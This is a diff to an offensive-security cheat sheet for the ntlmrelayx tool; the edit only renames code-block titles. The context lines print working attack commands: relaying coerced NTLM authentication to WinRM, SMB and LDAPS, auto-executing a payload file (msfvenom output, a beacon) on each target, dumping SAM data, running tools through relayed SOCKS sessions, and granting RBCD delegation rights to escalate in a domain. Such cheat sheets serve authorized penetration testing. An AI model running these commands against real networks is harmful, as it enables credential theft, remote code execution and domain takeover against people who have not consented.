@@ -6,7 +6,7 @@
 
 Catch coerced NTLM auth and relay it to WinRM (5985) on the target. `-smb2support` lets the SMB receiver accept SMBv2/3 connections.
 
-```sh title:"Relay coerced NTLM to WinRM, SMB2 receiver enabled"
+```sh title:"Ntlmrelayx Relay coerced NTLM to WinRM, SMB2 receiver enabled"
 ntlmrelayx.py -smb2support -t winrms://$rhost_ip
 ```
 <!-- cheat
@@ -17,7 +17,7 @@ import domain_ip
 
 Relay coerced NTLM to SMB on the targets in `$targets_file` and auto-exec `$payload_file` (msfvenom output, beacon, etc.) under the relayed user.
 
-```sh title:"Relay to SMB and auto-exec payload on each target"
+```sh title:"Ntlmrelayx Relay to SMB and auto-exec payload on each target"
 ntlmrelayx.py -tf $targets_file -smb2support -e $payload_file
 ```
 <!-- cheat
@@ -29,7 +29,7 @@ var payload_file
 
 Stand up a SOCKS proxy backed by relayed sessions. Use `proxychains` with the resulting SOCKS endpoint to drive any tool through a captured session.
 
-```sh title:"Relay to SOCKS, drive tools through proxychains"
+```sh title:"Ntlmrelayx Relay to SOCKS, drive tools through proxychains"
 ntlmrelayx.py -tf $targets_file -socks -smb2support
 ```
 <!-- cheat
@@ -40,7 +40,7 @@ var targets_file
 
 Default relay to SMB and dump captured info (SAM, shares, etc.) for each successful relay.
 
-```sh title:"Relay to targets, dump info on each successful auth"
+```sh title:"Ntlmrelayx Relay to targets, dump info on each successful auth"
 ntlmrelayx.py -tf $targets_file -smb2support
 ```
 <!-- cheat
@@ -65,7 +65,7 @@ import domain_ip
 
 Relay coerced NTLM to LDAPS on the DC and abuse it to grant RBCD/delegation rights — classic mitm6 escalation step.
 
-```sh title:"Relay to LDAPS for RBCD/delegate-access escalation"
+```sh title:"Ntlmrelayx Relay to LDAPS for RBCD/delegate-access escalation"
 ntlmrelayx.py -t ldaps://$rhost_ip -wh $lhost --delegate-access
 ```
 <!-- cheat
